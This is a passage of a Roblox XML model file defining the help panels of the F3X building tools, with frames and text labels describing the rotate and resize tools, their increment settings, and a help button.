												<string name="Text">ROTATE TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX2F449B35626C4874B48B5F13EF9DC92E">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">IncrementInfo</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>395</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>130</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextLabel" referent="RBX8B67998AA11345B5B88B11D491D5637B">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>15</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>60</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Lets you choose how many degrees to rotate the parts.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX11E33997B83C485D9DAF28B7F01F21C0">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Increment</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX518C750FAFAD469391C1918854C605C5">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>70</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>50</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">TIP: Use the - key to focus on the increment input.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXA93FE3A3E90F4773B89EAF2404EF2D4D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ResizeInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXBE71FA016EEA48D7876CE263F5F6D0B4">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>330</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX4688E6D0F0F4441BB3B44C6E4939D99A">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">DirectionsInfo</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>60</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>300</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextLabel" referent="RBXD6DB2D44DD0640C3B584D8BDF3414C52">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>15</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>120</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text"><![CDATA[Lets you choose in which directions to resize the part.

TIP: You can switch which part has the handles by right-clicking.]]></string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX0230CBE2FBB049C49791D66B9415123A">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Directions</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX1062FBAEA31F45729E4A3BE16AC0F33D">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278497260</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX42A02A7D17B64B298C956A3D81C4ED3A">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>50</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Allows you to resize parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXB513889209634DF6BDBE7B7233FE3E81">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">RESIZE TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXAE6AD5CF69534111B74C236EEADC254C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">IncrementInfo</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>200</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>140</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextLabel" referent="RBXA142B6C294904B208BBCE54E41DC4FFC">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>15</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>60</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Lets you choose how many studs to resize the parts.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX452B20BBB9DD465DAB08E93FF104A321">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Increment</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBXC4D558AA63B444C1A9C8ED8282DA755E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>70</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>50</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">TIP: Use the - key to focus on the increment input.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXFFDBC6CE25004649920C5439ECE7F2AB">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.75</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">InfoButtons</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>350</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>32</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX28F3B3565F5643B1A1F3DAF2571E2580">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>7</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-28</XO>
											<YS>0</YS>
											<YO>17</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">true</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBX10B604AFA84E4C7082E61800E42097BA">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4283804415</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141911973</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">HelpButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-32</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>32</XO>
											<YS>0</YS>
											<YO>32</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX9C72A1FC92754D039605F27BCF38625E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
